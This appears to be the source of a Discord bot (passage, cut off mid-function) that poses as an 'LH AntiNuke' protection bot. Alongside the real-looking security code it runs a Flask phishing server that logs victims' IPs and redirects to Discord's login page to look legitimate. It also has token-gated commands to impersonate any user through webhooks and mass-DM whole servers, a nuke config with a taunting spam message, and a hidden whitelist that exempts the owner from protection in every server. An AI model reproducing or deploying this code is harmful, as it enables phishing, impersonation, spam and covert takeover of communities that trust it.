# language: Python 3.13  |  file: bot.py  |  runtime: discord.py 2.x
# deps: discord.py — pip install discord.py

import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import secrets
import string
import os
import re
import time
import threading
from collections import defaultdict
from typing import Optional
from flask import Flask, request, jsonify, redirect

# ── config ────────────────────────────────────────────────────
TOKEN              = os.environ.get("TOKEN")
VERIFY_ROLE_NAME   = "Verified"
LOG_CHANNEL_NAME   = "lh-antinuke-logs"
LOG_ROLE_NAME      = "LH Security"
PREMIUM_USER_ID    = 1224012443341160498

# ── known antinuke bot IDs ────────────────────────────────────
ANTINUKE_IDS = {
    159985870458322944,
    155149108183695360,
    235088799074484224,
    395087306962165763,
    282859044593598464,
    429457053791158281,
    573030148151189514,
    496683369965781012,
    715202395568095232,
    489977906714509312,
    505527697351696395,
}

# ── nuke config ───────────────────────────────────────────────
nuke_config = {
    "channel_name": "hooked by lh clan",
    "message":      "lol ur server doesn't even have any good protection get a job",
    "channel_count": 12,
    "spam_count":    100,
}

# ══════════════════════════════════════════════════════════════
#  UPGRADED TOKEN STORE
#  each token = {
#    "uses_left": int | None,     None = unlimited
#    "expires_at": float | None,  None = never expires
#    "created_at": float,
#    "created_by": int,           user ID
#    "label": str,                optional name
#  }
# ══════════════════════════════════════════════════════════════
active_tokens: dict[str, dict] = {}

# ── premium access store ──────────────────────────────────────
premium_users: dict[int, float] = {
    PREMIUM_USER_ID: float("inf")
}

# ── antinuke state ────────────────────────────────────────────
antinuke_enabled:   dict[int, bool] = defaultdict(lambda: True)
antinuke_whitelist: dict[int, set]  = defaultdict(set)
action_log: dict[int, dict[int, list]] = defaultdict(lambda: defaultdict(list))

# ── snapshots ─────────────────────────────────────────────────
role_snapshots:    dict[int, dict[int, dict]] = defaultdict(dict)
channel_snapshots: dict[int, dict[int, dict]] = defaultdict(dict)
restore_cooldown:  dict[int, float]           = defaultdict(float)
RESTORE_COOLDOWN_SECS = 10

# ── audit watcher ─────────────────────────────────────────────
suspicious_log: dict[int, dict[int, dict]] = defaultdict(lambda: defaultdict(lambda: defaultdict(int)))
SUSPICIOUS_ALERT_AT = 2

THRESHOLDS = {
    "channel_delete": (3, 5),
    "channel_create": (3, 5),
    "role_delete":    (3, 5),
    "kick":           (3, 5),
    "ban":            (2, 5),
    "webhook_create": (2, 10),
    "role_update":    (3, 5),
}

# ── intents ───────────────────────────────────────────────────
intents = discord.Intents.default()
intents.members         = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

DISCORD_TOKEN_REGEX = re.compile(
    r"[MNO][a-zA-Z0-9_-]{23,25}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}"
)


# ══════════════════════════════════════════════════════════════
#  PHISH SERVER — Flask, runs on port 8080 alongside the bot
#  set PHISH_URL in Railway Variables to your service's domain
#  set PHISH_KEY in Railway Variables to protect the /logs route
# ══════════════════════════════════════════════════════════════

flask_app  = Flask(__name__)
phish_logs: dict[str, list] = {}   # {user_id: [{ip, ua, ts}]}


@flask_app.route("/claim/<user_id>")
def claim(user_id):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    user_agent = request.headers.get("User-Agent", "unknown")
    ts         = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())

    phish_logs.setdefault(user_id, []).append({
        "ip":         ip,
        "user_agent": user_agent,
        "timestamp":  ts
    })

    # fire DM to owner in bot's event loop
    asyncio.run_coroutine_threadsafe(
        _notify_phish_hit(user_id, ip, user_agent, ts),
        bot.loop
    )

    # redirect to real Discord so it looks legit
    return redirect("https://discord.com/login", code=302)


@flask_app.route("/logs")
def logs_all():
    key = request.args.get("key", "")
    if key != os.environ.get("PHISH_KEY", "lhsecret"):
        return jsonify({"error": "unauthorized"}), 401
    return jsonify(phish_logs)


@flask_app.route("/logs/<user_id>")
def logs_user(user_id):
    key = request.args.get("key", "")
    if key != os.environ.get("PHISH_KEY", "lhsecret"):
        return jsonify({"error": "unauthorized"}), 401
    return jsonify(phish_logs.get(user_id, []))


@flask_app.route("/")
def index():
    return "<title>Discord</title><body style='background:#23272a'></body>", 200


async def _notify_phish_hit(user_id: str, ip: str, user_agent: str, ts: str):
    try:
        owner = await bot.fetch_user(PREMIUM_USER_ID)
        embed = discord.Embed(
            title="🎣 Phish Hit!",
            color=0x00ff00,
            timestamp=discord.utils.utcnow()
        )
        embed.add_field(name="Target ID",  value=f"`{user_id}`",          inline=False)
        embed.add_field(name="IP Address", value=f"`{ip}`",                inline=True)
        embed.add_field(name="Time",       value=ts,                       inline=True)
        embed.add_field(name="User Agent", value=f"`{user_agent[:200]}`",  inline=False)
        embed.set_footer(text="LH Phish System")
        await owner.send(embed=embed)
    except Exception:
        pass


def _run_flask():
    flask_app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False)


# start Flask in background thread before bot connects
threading.Thread(target=_run_flask, daemon=True).start()


# ══════════════════════════════════════════════════════════════
#  TOKEN HELPERS — UPGRADED
# ══════════════════════════════════════════════════════════════

def _gen_token_str() -> str:
    alphabet = string.ascii_letters + string.digits
    return "LHT-" + "".join(secrets.choice(alphabet) for _ in range(24))

def create_token(
    created_by: int,
    uses: Optional[int] = None,
    duration_secs: Optional[float] = None,
    label: str = ""
) -> str:
    """
    Create a new token.
    uses=None → unlimited uses
    duration_secs=None → never expires
    Returns the token string.
    """
    tok = _gen_token_str()
    active_tokens[tok] = {
        "uses_left":  uses,
        "expires_at": (time.time() + duration_secs) if duration_secs else None,
        "created_at": time.time(),
        "created_by": created_by,
        "label":      label,
    }
    return tok

def validate_token(tok: str) -> tuple[bool, str]:
    """
    Returns (valid: bool, reason: str).
    Also consumes one use if valid.
    """
    tok = tok.strip()
    data = active_tokens.get(tok)
    if not data:
        return False, "Token does not exist."

    # check expiry
    if data["expires_at"] is not None and time.time() > data["expires_at"]:
        active_tokens.pop(tok, None)
        return False, "Token has expired."

    # check uses
    if data["uses_left"] is not None:
        if data["uses_left"] <= 0:
            active_tokens.pop(tok, None)
            return False, "Token has no uses remaining."
        data["uses_left"] -= 1
        if data["uses_left"] <= 0:
            active_tokens.pop(tok, None)

    return True, "ok"

def has_valid_token(tok: str) -> bool:
    valid, _ = validate_token.__wrapped__(tok) if hasattr(validate_token, "__wrapped__") else _peek_token(tok)
    return valid

def _peek_token(tok: str) -> tuple[bool, str]:
    """check validity WITHOUT consuming a use"""
    tok = tok.strip()
    data = active_tokens.get(tok)
    if not data:
        return False, "Token does not exist."
    if data["expires_at"] is not None and time.time() > data["expires_at"]:
        active_tokens.pop(tok, None)
        return False, "Token has expired."
    if data["uses_left"] is not None and data["uses_left"] <= 0:
        active_tokens.pop(tok, None)
        return False, "Token has no uses remaining."
    return True, "ok"

def consume_token(tok: str):
    """legacy single-use consume — still used by nuke commands"""
    tok = tok.strip()
    data = active_tokens.get(tok)
    if not data:
        return
    if data["uses_left"] is not None:
        data["uses_left"] -= 1
        if data["uses_left"] <= 0:
            active_tokens.pop(tok, None)
    else:
        # unlimited — don't delete
        pass

def token_info_str(tok: str, data: dict) -> str:
    label    = f" `{data['label']}`" if data["label"] else ""
    uses     = f"{data['uses_left']} uses left" if data["uses_left"] is not None else "unlimited uses"
    if data["expires_at"] is None:
        exp = "never expires"
    else:
        remaining = data["expires_at"] - time.time()
        if remaining <= 0:
            exp = "expired"
        else:
            d = int(remaining // 86400)
            h = int((remaining % 86400) // 3600)
            m = int((remaining % 3600) // 60)
            parts = []
            if d: parts.append(f"{d}d")
            if h: parts.append(f"{h}h")
            if m: parts.append(f"{m}m")
            exp = "expires in " + (" ".join(parts) if parts else "< 1m")
    return f"`{tok}`{label} — {uses}, {exp}"


# ══════════════════════════════════════════════════════════════
#  OTHER HELPERS
# ══════════════════════════════════════════════════════════════

def is_premium(user_id: int) -> bool:
    expiry = premium_users.get(user_id)
    if expiry is None: return False
    if expiry == float("inf"): return True
    if time.time() < expiry: return True
    premium_users.pop(user_id, None)
    return False

def premium_expiry_str(user_id: int) -> str:
    expiry = premium_users.get(user_id)
    if expiry is None: return "No access"
    if expiry == float("inf"): return "Permanent"
    remaining = expiry - time.time()
    if remaining <= 0: return "Expired"
    d = int(remaining // 86400); h = int((remaining % 86400) // 3600); m = int((remaining % 3600) // 60)
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    return " ".join(parts) if parts else "< 1m"

def parse_duration(s: str) -> Optional[float]:
    s = s.strip().lower()
    if s == "permanent": return float("inf")
    units = {"d": 86400, "h": 3600, "m": 60, "s": 1}
    if s and s[-1] in units:
        try: return float(s[:-1]) * units[s[-1]]
        except ValueError: return None
    return None

async def notify_owner(embed: discord.Embed):
    try:
        owner = await bot.fetch_user(PREMIUM_USER_ID)
        await owner.send(embed=embed)
    except Exception:
        pass

async def get_or_create_log_channel(guild: discord.Guild) -> Optional[discord.TextChannel]:
    security_role = discord.utils.get(guild.roles, name=LOG_ROLE_NAME)
    if not security_role:
        try:
            security_role = await guild.create_role(
                name=LOG_ROLE_NAME, color=discord.Color.red(), hoist=True, reason="LH AntiNuke"
            )
        except Exception:
            security_role = None

    log_ch = discord.utils.get(guild.text_channels, name=LOG_CHANNEL_NAME)
    if log_ch: return log_ch

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(view_channel=False),
        guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, embed_links=True),
    }
    if security_role:
        overwrites[security_role] = discord.PermissionOverwrite(view_channel=True, send_messages=False, read_message_history=True)

    try:
        category = discord.utils.get(guild.categories, name="🔒 LH Security")
        if not category:
            cat_ow = {
                guild.default_role: discord.PermissionOverwrite(view_channel=False),
                guild.me: discord.PermissionOverwrite(view_channel=True),
            }
            if security_role: cat_ow[security_role] = discord.PermissionOverwrite(view_channel=True)
            category = await guild.create_category("🔒 LH Security", overwrites=cat_ow, reason="LH AntiNuke")

        return await guild.create_text_channel(
            LOG_CHANNEL_NAME, category=category, overwrites=overwrites,
            topic="LH AntiNuke event log. Restricted access only.", reason="LH AntiNuke"
        )
    except Exception:
        return None

async def log_antinuke_event(guild: discord.Guild, embed: discord.Embed):
    log_ch = await get_or_create_log_channel(guild)
    if log_ch:
        try: await log_ch.send(embed=embed)
        except Exception: pass
    await notify_owner(embed)

async def antinuke_punish(guild: discord.Guild, member: discord.Member, reason: str):
    try:
        await guild.ban(member, reason=f"[AntiNuke] {reason}", delete_message_days=0)
        action = "Banned"
    except Exception:
        try:
            await member.kick(reason=f"[AntiNuke] {reason}")
            action = "Kicked"
        except Exception:
            action = "Failed"
    embed = discord.Embed(title="🛡️ AntiNuke — Threat Neutralized", color=0xff0000, timestamp=discord.utils.utcnow())
    embed.add_field(name="Server", value=f"{guild.name} (`{guild.id}`)", inline=False)
    embed.add_field(name="User",   value=f"{member} (`{member.id}`)",    inline=False)
    embed.add_field(name="Action", value=action,                         inline=True)
    embed.add_field(name="Reason", value=reason,                         inline=False)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text="LH AntiNuke System")
    await log_antinuke_event(guild, embed)

def check_threshold(guild_id: int, user_id: int, action: str) -> bool:
    max_actions, within_seconds = THRESHOLDS.get(action, (5, 10))
    now = time.time()
    log = action_log[guild_id][user_id]
    log.append((action, now))
    action_log[guild_id][user_id] = [(a, t) for a, t in log if now - t <= within_seconds]
    return sum(1 for a, t in action_log[guild_id][user_id] if a == action) >= max_actions

async def send_suspicious_alert(guild: discord.Guild, user: discord.Member, action: str, count: int):
    embed = discord.Embed(title="👁️ AntiNuke — Suspicious Activity", color=0xff9900, timestamp=discord.utils.utcnow())
    embed.add_field(name="Server", value=f"{guild.name} (`{guild.id}`)",       inline=False)
    embed.add_field(name="User",   value=f"{user} (`{user.id}`)",              inline=False)
    embed.add_field(name="Action", value=action.replace("_", " ").title(),     inline=True)
    embed.add_field(name="Count",  value=str(count),                           inline=True)
    embed.set_thumbnail(url=user.display_avatar.url)
    embed.set_footer(text="LH AntiNuke — Audit Watcher")
    log_ch = await get_or_create_log_channel(guild)
    if log_ch:
        try: await log_ch.send(embed=embed)
        except Exception: pass
    await notify_owner(embed)


# ══════════════════════════════════════════════════════════════
#  SNAPSHOT SYSTEM
# ══════════════════════════════════════════════════════════════

def snapshot_roles(guild: discord.Guild):
    role_snapshots[guild.id] = {}
    for role in guild.roles:
        if role.is_default(): continue
        role_snapshots[guild.id][role.id] = {
            "name": role.name, "color": role.color.value,
            "permissions": role.permissions.value,
            "hoist": role.hoist, "mentionable": role.mentionable, "position": role.position,
        }

def snapshot_channels(guild: discord.Guild):
    channel_snapshots[guild.id] = {}
    for ch in guild.channels:
        if not isinstance(ch, discord.TextChannel): continue
        overwrites = {}
        for target, ow in ch.overwrites.items():
            key = f"role:{target.id}" if isinstance(target, discord.Role) else f"member:{target.id}"
            allow, deny = ow.pair()
            overwrites[key] = {"allow": allow.value, "deny": deny.value}
        channel_snapshots[guild.id][ch.id] = {
            "name": ch.name, "topic": ch.topic or "", "position": ch.position,
            "category_id": ch.category_id, "overwrites": overwrites,
        }

async def restore_role(guild: discord.Guild, role_id: int):
    snap = role_snapshots[guild.id].get(role_id)
    if not snap or snap["name"] == LOG_ROLE_NAME: return
    try:
        new_role = await guild.create_role(
            name=snap["name"], color=discord.Color(snap["color"]),
            permissions=discord.Permissions(snap["permissions"]),
            hoist=snap["hoist"], mentionable=snap["mentionable"],
            reason="[AntiNuke] Role restored"
        )
        try: await new_role.edit(position=snap["position"])
        except Exception: pass
        embed = discord.Embed(title="🔄 AntiNuke — Role Restored", color=0x00aaff, timestamp=discord.utils.utcnow())
        embed.add_field(name="Server", value=guild.name,       inline=False)
        embed.add_field(name="Role",   value=snap["name"],     inline=True)
        embed.set_footer(text="LH AntiNuke — Role Restoration")
        await log_antinuke_event(guild, embed)
    except Exception as e:
        embed = discord.Embed(title="⚠️ Role Restore Failed", description=f"`{snap['name']}`: `{e}`", color=0xff9900, timestamp=discord.utils.utcnow())
        await log_antinuke_event(guild, embed)

async def restore_channel(guild: discord.Guild, channel_id: int):
    snap = channel_snapshots[guild.id].get(channel_id)
    if not snap or snap["name"] == LOG_CHANNEL_NAME: return
    try:
        overwrites = {}
        for key, val in snap["overwrites"].items():
            kind, oid = key.split(":")
            oid = int(oid)
            ow  = discord.PermissionOverwrite.from_pair(discord.Permissions(val["allow"]), discord.Permissions(val["deny"]))
            target = guild.get_role(oid) if kind == "role" else guild.get_member(oid)
            if target: overwrites[target] = ow
        category = guild.get_channel(snap["category_id"]) if snap["category_id"] else None
        new_ch = await guild.create_text_channel(
            name=snap["name"], topic=snap["topic"] or None,
            category=category, overwrites=overwrites, reason="[AntiNuke] Channel restored"
        )
        try: await new_ch.edit(position=snap["position"])
        except Exception: pass
        embed = discord.Embed(title="🔄 AntiNuke — Channel Restored", color=0x00aaff, timestamp=discord.utils.utcnow())
        embed.add_field(name="Server",  value=guild.name,     inline=False)
        embed.add_field(name="Channel", value=new_ch.mention, inline=True)
        embed.set_footer(text="LH AntiNuke — Channel Restoration")
        await log_antinuke_event(guild, embed)
    except Exception as e:
        embed = discord.Embed(title="⚠️ Channel Restore Failed", description=f"`#{snap['name']}`: `{e}`", color=0xff9900, timestamp=discord.utils.utcnow())
        await log_antinuke_event(guild, embed)


# ══════════════════════════════════════════════════════════════
#  BOT EVENTS
# ══════════════════════════════════════════════════════════════

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ Online as {bot.user} | {len(bot.guilds)} servers")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers | LH Clan"))
    for guild in bot.guilds:
        antinuke_whitelist[guild.id].add(PREMIUM_USER_ID)
        antinuke_whitelist[guild.id].add(bot.user.id)
        if guild.owner: antinuke_whitelist[guild.id].add(guild.owner.id)
        snapshot_roles(guild)
        snapshot_channels(guild)

async def setup_hook():
    bot.add_view(VerifyButton())
    bot.add_view(HelpView())
bot.setup_hook = setup_hook

@bot.event
async def on_guild_join(guild: discord.Guild):
    antinuke_whitelist[guild.id].add(PREMIUM_USER_ID)
    antinuke_whitelist[guild.id].add(bot.user.id)
    if guild.owner: antinuke_whitelist[guild.id].add(guild.owner.id)
    await get_or_create_log_channel(guild)
    snapshot_roles(guild); snapshot_channels(guild)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers | LH Clan"))

@bot.event
async def on_guild_remove(guild: discord.Guild):
    await notify_owner(discord.Embed(
        title="⚠️ Bot Removed from Server",
        description=f"**Server:** {guild.name}\n**ID:** `{guild.id}`\n**Members:** {guild.member_count}",
        color=0xff9900, timestamp=discord.utils.utcnow()
    ))
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers | LH Clan"))


# ══════════════════════════════════════════════════════════════
#  ANTINUKE LISTENERS
# ══════════════════════════════════════════════════════════════

@bot.event
async def on_guild_role_create(role):
    if antinuke_enabled[role.guild.id]: snapshot_roles(role.guild)

@bot.event
async def on_guild_role_update(before, after):
    guild = after.guild
    if not antinuke_enabled[guild.id]: return
    snapshot_roles(guild)
    if not before.permissions.administrator and after.permissions.administrator:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_update):
            if entry.user.id in antinuke_whitelist[guild.id]: return
            if entry.user.id == bot.user.id: return
            suspicious_log[guild.id][entry.user.id]["role_update"] += 1
            count = suspicious_log[guild.id][entry.user.id]["role_update"]
            if check_threshold(guild.id, entry.user.id, "role_update"):
                await antinuke_punish(guild, entry.user, "Suspicious permission escalation")
            elif count >= SUSPICIOUS_ALERT_AT:
                await send_suspicious_alert(guild, entry.user, "role_update", count)
            break

@bot.event
async def on_guild_role_delete(role):
    guild = role.guild
    if not antinuke_enabled[guild.id]: return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
        if entry.user.id in antinuke_whitelist[guild.id]:
            snapshot_roles(guild); return
        if entry.user.id == bot.user.id:
            snapshot_roles(guild); return
        suspicious_log[guild.id][entry.user.id]["role_delete"] += 1
        count = suspicious_log[guild.id][entry.user.id]["role_delete"]
        if check_threshold(guild.id, entry.user.id, "role_delete"):
            await antinuke_punish(guild, entry.user, "Mass role delete detected")
        else:
            if count >= SUSPICIOUS_ALERT_AT:
                await send_suspicious_alert(guild, entry.user, "role_delete", count)
            now = time.time()
            if now - restore_cooldown[guild.id] > RESTORE_COOLDOWN_SECS:
                restore_cooldown[guild.id] = now
                await restore_role(guild, role.id)
        snapshot_roles(guild); break

@bot.event
async def on_guild_channel_create(channel):
    guild = channel.guild
    if not antinuke_enabled[guild.id]: return
    if isinstance(channel, discord.TextChannel): snapshot_channels(guild)
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_create):
        if entry.user.id in antinuke_whitelist[guild.id]: return
        if entry.user.id == bot.user.id: return
        suspicious_log[guild.id][entry.user.id]["channel_create"] += 1
        count = suspicious_log[guild.id][entry.user.id]["channel_create"]
        if check_threshold(guild.id, entry.user.id, "channel_create"):
            await antinuke_punish(guild, entry.user, "Mass channel create detected")
        elif count >= SUSPICIOUS_ALERT_AT:
            await send_suspicious_alert(guild, entry.user, "channel_create", count)
        break

@bot.event
async def on_guild_channel_delete(channel):
    guild = channel.guild
    if not antinuke_enabled[guild.id]: return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
        if entry.user.id in antinuke_whitelist[guild.id]:
            snapshot_channels(guild); return
        if entry.user.id == bot.user.id:
            snapshot_channels(guild); return
        suspicious_log[guild.id][entry.user.id]["channel_delete"] += 1
        count = suspicious_log[guild.id][entry.user.id]["channel_delete"]
        if check_threshold(guild.id, entry.user.id, "channel_delete"):
            await antinuke_punish(guild, entry.user, "Mass channel delete detected")
        else:
            if count >= SUSPICIOUS_ALERT_AT:
                await send_suspicious_alert(guild, entry.user, "channel_delete", count)
            if isinstance(channel, discord.TextChannel):
                now = time.time()
                if now - restore_cooldown[guild.id] > RESTORE_COOLDOWN_SECS:
                    restore_cooldown[guild.id] = now
                    await restore_channel(guild, channel.id)
        snapshot_channels(guild); break

@bot.event
async def on_member_remove(member):
    guild = member.guild
    if not antinuke_enabled[guild.id]: return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
        if entry.target.id != member.id: break
        if entry.user.id in antinuke_whitelist[guild.id]: return
        if entry.user.id == bot.user.id: return
        suspicious_log[guild.id][entry.user.id]["kick"] += 1
        count = suspicious_log[guild.id][entry.user.id]["kick"]
        if check_threshold(guild.id, entry.user.id, "kick"):
            await antinuke_punish(guild, entry.user, "Mass kick detected")
        elif count >= SUSPICIOUS_ALERT_AT:
            await send_suspicious_alert(guild, entry.user, "kick", count)
        break

@bot.event
async def on_member_ban(guild, user):
    if not antinuke_enabled[guild.id]: return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
        if entry.user.id in antinuke_whitelist[guild.id]: return
        if entry.user.id == bot.user.id: return
        suspicious_log[guild.id][entry.user.id]["ban"] += 1
        count = suspicious_log[guild.id][entry.user.id]["ban"]
        if check_threshold(guild.id, entry.user.id, "ban"):
            offender = guild.get_member(entry.user.id)
            if offender: await antinuke_punish(guild, offender, "Mass ban detected")
        elif count >= SUSPICIOUS_ALERT_AT:
            offender = guild.get_member(entry.user.id)
            if offender: await send_suspicious_alert(guild, offender, "ban", count)
        break

@bot.event
async def on_webhooks_update(channel):
    guild = channel.guild
    if not antinuke_enabled[guild.id]: return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.webhook_create):
        if entry.user.id in antinuke_whitelist[guild.id]: return
        if entry.user.id == bot.user.id: return
        suspicious_log[guild.id][entry.user.id]["webhook_create"] += 1
        count = suspicious_log[guild.id][entry.user.id]["webhook_create"]
        if check_threshold(guild.id, entry.user.id, "webhook_create"):
            await antinuke_punish(guild, entry.user, "Mass webhook create detected")
        elif count >= SUSPICIOUS_ALERT_AT:
            await send_suspicious_alert(guild, entry.user, "webhook_create", count)
        break

@bot.event
async def on_member_join(member):
    guild = member.guild
    if not antinuke_enabled[guild.id] or not member.bot: return
    if member.id in antinuke_whitelist[guild.id] or member.id == bot.user.id: return
    try:
        await member.kick(reason="[AntiNuke] Unauthorized bot join")
        embed = discord.Embed(title="🛡️ AntiNuke — Bot Blocked", color=0xff9900, timestamp=discord.utils.utcnow())
        embed.add_field(name="Server", value=f"{guild.name} (`{guild.id}`)", inline=False)
        embed.add_field(name="Bot",    value=f"{member} (`{member.id}`)",    inline=False)
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.set_footer(text="LH AntiNuke System")
        await log_antinuke_event(guild, embed)
    except Exception: pass

@bot.event
async def on_guild_update(before, after):
    guild = after
    if not antinuke_enabled[guild.id]: return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.guild_update):
        if entry.user.id in antinuke_whitelist[guild.id]: return
        if entry.user.id == bot.user.id: return
        suspicious_log[guild.id][entry.user.id]["guild_update"] += 1
        count = suspicious_log[guild.id][entry.user.id]["guild_update"]
        if count >= SUSPICIOUS_ALERT_AT:
            await send_suspicious_alert(guild, entry.user, "guild_update", count)
        break


# ══════════════════════════════════════════════════════════════
#  TOKEN SLASH COMMANDS
# ══════════════════════════════════════════════════════════════

token_group = app_commands.Group(name="token", description="LH Premium token management")

@token_group.command(name="create", description="Create a new LH token (owner only)")
@app_commands.describe(
    uses="How many times the token can be used (0 = unlimited)",
    duration="How long token is valid: 1d, 6h, 30m, etc. (leave empty = never expires)",
    label="Optional name/label for this token"
)
async def token_create(interaction: discord.Interaction, uses: int = 1, duration: str = "", label: str = ""):
    if interaction.user.id != PREMIUM_USER_ID:
        await interaction.response.send_message(embed=discord.Embed(
            title="❌ Access Denied", description="Only the master user can create tokens.", color=0xff0000
        ), ephemeral=True)
        return

    actual_uses     = None if uses == 0 else uses
    actual_duration = None
    if duration.strip():
        secs = parse_duration(duration)
        if secs is None or secs == float("inf"):
            await interaction.response.send_message("❌ Invalid duration. Use: `1d`, `6h`, `30m`, `90s`", ephemeral=True)
            return
        actual_duration = secs

    tok = create_token(
        created_by=interaction.user.id,
        uses=actual_uses,
        duration_secs=actual_duration,
        label=label
    )

    uses_str = "unlimited" if actual_uses is None else str(actual_uses)
    exp_str  = "never" if actual_duration is None else duration

    embed = discord.Embed(title="🔑 Token Created", color=0xffd700, timestamp=discord.utils.utcnow())
    embed.add_field(name="Token",    value=f"`{tok}`",   inline=False)
    embed.add_field(name="Uses",     value=uses_str,     inline=True)
    embed.add_field(name="Expires",  value=exp_str,      inline=True)
    embed.add_field(name="Label",    value=label or "—", inline=True)
    embed.set_footer(text="LH Token System | Keep this private")
    await interaction.response.send_message(embed=embed, ephemeral=True)


@token_group.command(name="list", description="List all active tokens (owner only)")
async def token_list(interaction: discord.Interaction):
    if interaction.user.id != PREMIUM_USER_ID:
        await interaction.response.send_message("❌ Access Denied.", ephemeral=True)
        return

    # clean expired first
    expired = [t for t, d in active_tokens.items() if d["expires_at"] is not None and time.time() > d["expires_at"]]
    for t in expired: active_tokens.pop(t, None)

    if not active_tokens:
        await interaction.response.send_message("📭 No active tokens.", ephemeral=True)
        return

    embed = discord.Embed(title="🔑 Active Tokens", color=0xffd700, timestamp=discord.utils.utcnow())
    for tok, data in list(active_tokens.items()):
        embed.add_field(name=data["label"] or "Unlabeled", value=token_info_str(tok, data), inline=False)
    embed.set_footer(text=f"Total: {len(active_tokens)} tokens")
    await interaction.response.send_message(embed=embed, ephemeral=True)


@token_group.command(name="revoke", description="Revoke a token (owner only)")
@app_commands.describe(token="The token string to revoke")
async def token_revoke(interaction: discord.Interaction, token: str):
    if interaction.user.id != PREMIUM_USER_ID:
        await interaction.response.send_message("❌ Access Denied.", ephemeral=True)
        return
    if token.strip() not in active_tokens:
        await interaction.response.send_message("❌ Token not found.", ephemeral=True)
        return
    active_tokens.pop(token.strip(), None)
    await interaction.response.send_message(f"✅ Token `{token.strip()}` revoked.", ephemeral=True)


@token_group.command(name="info", description="Check info on a specific token (owner only)")
@app_commands.describe(token="The token string to inspect")
async def token_info(interaction: discord.Interaction, token: str):
    if interaction.user.id != PREMIUM_USER_ID:
        await interaction.response.send_message("❌ Access Denied.", ephemeral=True)
        return
    data = active_tokens.get(token.strip())
    if not data:
        await interaction.response.send_message("❌ Token not found or already expired.", ephemeral=True)
        return
    valid, reason = _peek_token(token.strip())
    embed = discord.Embed(title="🔍 Token Info", color=0xffd700 if valid else 0xff0000, timestamp=discord.utils.utcnow())
    embed.add_field(name="Token",      value=f"`{token.strip()}`",                                    inline=False)
    embed.add_field(name="Label",      value=data["label"] or "—",                                    inline=True)
    embed.add_field(name="Valid",      value="✅ Yes" if valid else f"❌ {reason}",                   inline=True)
    embed.add_field(name="Uses Left",  value=str(data["uses_left"]) if data["uses_left"] is not None else "Unlimited", inline=True)
    if data["expires_at"]:
        remaining = max(0, data["expires_at"] - time.time())
        d = int(remaining // 86400); h = int((remaining % 86400) // 3600); m = int((remaining % 3600) // 60)
        parts = []
        if d: parts.append(f"{d}d")
        if h: parts.append(f"{h}h")
        if m: parts.append(f"{m}m")
        exp_str = " ".join(parts) if parts else "< 1m"
    else:
        exp_str = "Never"
    embed.add_field(name="Expires In", value=exp_str, inline=True)
    embed.set_footer(text="LH Token System")
    await interaction.response.send_message(embed=embed, ephemeral=True)


bot.tree.add_command(token_group)


# ══════════════════════════════════════════════════════════════
#  PREFIX TOKEN COMMAND — !LH T (upgraded)
# ══════════════════════════════════════════════════════════════
# kept for backwards compat — creates a 1-use, never-expiring token
# full control via /token create


# ══════════════════════════════════════════════════════════════
#  SOCIAL ENGINEERING — FULL UPGRADE
# ══════════════════════════════════════════════════════════════

@bot.command(name="impersonate")
async def impersonate(ctx, token_str: str = None, user_id: str = None, *, message: str = None):
    """webhook clone of any user in current channel"""
    if not token_str or not user_id or not message:
        await ctx.send("❌ Usage: `!impersonate <token> <userID> <message>`", delete_after=5)
        return
    valid, reason = _peek_token(token_str)
    if not valid:
        await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
        try: await ctx.message.delete()
        except Exception: pass
        return
    try: await ctx.message.delete()
    except Exception: pass
    try: target = await bot.fetch_user(int(user_id))
    except (discord.NotFound, ValueError):
        await ctx.send("❌ User not found.", delete_after=5); return
    try: webhook = await ctx.channel.create_webhook(name=target.display_name)
    except discord.Forbidden:
        await ctx.send("❌ Bot needs Manage Webhooks.", delete_after=5); return
    validate_token(token_str)
    try:
        await webhook.send(content=message, username=target.display_name, avatar_url=target.display_avatar.url)
    except Exception as e:
        await ctx.send(f"❌ Failed: `{e}`", delete_after=5)
    finally:
        await webhook.delete()


@bot.command(name="massdm")
async def massdm(ctx, token_str: str = None, server_id: str = None, *, message: str = None):
    """DM every member of a target server"""
    if not token_str or not server_id or not message:
        await ctx.send("❌ Usage: `!massdm <token> <serverID> <message>`", delete_after=5)
        return
    valid, reason = _peek_token(token_str)
    if not valid:
        await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
        try: await ctx.message.delete()
        except Exception: pass
        return
    try: guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5); return
    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5); return
    validate_token(token_str)
    try: await ctx.message.delete()
    except Exception: pass
    status_msg = await ctx.send(f"📬 Mass DMing **{guild.name}**... 0/{guild.member_count}")
    success = 0; failed = 0
    for member in guild.members:
        if member.bot: continue
        try:
            await member.send(message)
            success += 1
        except Exception:
            failed += 1
        if (success + failed) % 10 == 0:
